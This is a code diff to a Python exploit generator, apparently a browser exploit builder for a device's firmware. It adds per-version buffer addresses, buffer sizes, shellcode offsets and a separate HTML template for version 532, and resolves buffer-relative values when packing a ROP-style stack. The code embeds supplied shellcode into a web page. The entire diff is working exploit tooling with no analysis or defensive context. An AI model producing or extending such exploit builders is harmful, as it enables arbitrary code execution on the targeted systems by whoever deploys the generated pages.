@@ -5,18 +5,36 @@ import inspect
 import os
 import shutil
 
+buffer_addr = {
+        '300': 0x1dd7b814,
+        '400': 0x1dd7b814,
+        '410': 0x1dd7b814,
+        '500': 0x1dd7b814,
+        '532': 0x1b201814
+}
+
+buffer_size = {
+        '300': 0x600,
+        '400': 0x600,
+        '410': 0x600,
+        '500': 0x600,
+        '532': 0x5c0
+}
+
 preserve_zeros = {
 	'300': [0x14, 0x28, 0x40, 0xd0, 0xe8, 0x110, 0x128],
 	'400': [0x14, 0x28, 0x40, 0xd0, 0xe8, 0x110, 0x128],
 	'410': [0x1C],
-	'500': [0x1C]
+	'500': [0x1C],
+        '532': [0xa8, 0xb0, 0xf8, 0x124, 0x154, 0x30c]
 }
 
 shellcode_offset = {
 	'300': 0x160,
 	'400': 0x160,
 	'410': 0x1B0,
-	'500': 0x1B0
+	'500': 0x1B0,
+        '532': 0x36c
 }
 
 def main():
@@ -28,7 +46,7 @@ def main():
 		print("Usage python generate_html.py {code.bin} {version} {output directory}")
 		return
 	ver=""
-	if int(ar2) >= 510:
+	if int(ar2) == 510:
 		ver="500"
 	else:
 		ver=ar2
@@ -40,8 +58,9 @@ def main():
 	
 	stack_js = stack_to_js(stack,ver)
 	code_js = code_to_js(open(ar1, 'rb').read())
-	
-	template = open('{0}/html/template.html'.format(path), 'r').read()
+
+	if ver == '532': template = open('{0}/html/template532.html'.format(path), 'r').read()
+	else: template = open('{0}/html/template.html'.format(path), 'r').read()
 	page = template.replace('{{ stack }}', stack_js)
 	page = page.replace('{{ code }}', code_js)
 	
@@ -101,7 +120,7 @@ def build_stack(ver):
 	path = os.path.dirname(os.path.abspath(filename))
 	text = open('{0}/stack/stack{1}.txt'.format(path,ver)).read()
 	output = open('{0}/bin/stack{1}.bin'.format(path,ver), 'w+b')
-	output.write(b'\x00' * 0x600)
+	output.write(b'\x00' * buffer_size[ver])
 
 	for line in text.splitlines():
 		line = line.strip()
@@ -116,6 +135,11 @@ def build_stack(ver):
 
 			output.seek(addr)
 			output.write(struct.pack('>I', value))
+		elif value.startswith('buf+'):
+                        value = buffer_addr[ver] + int(value.split('+')[1], 16)
+
+                        output.seek(addr)
+                        output.write(struct.pack('>I', value))
 
 	output.seek(0)
 	return output.read()
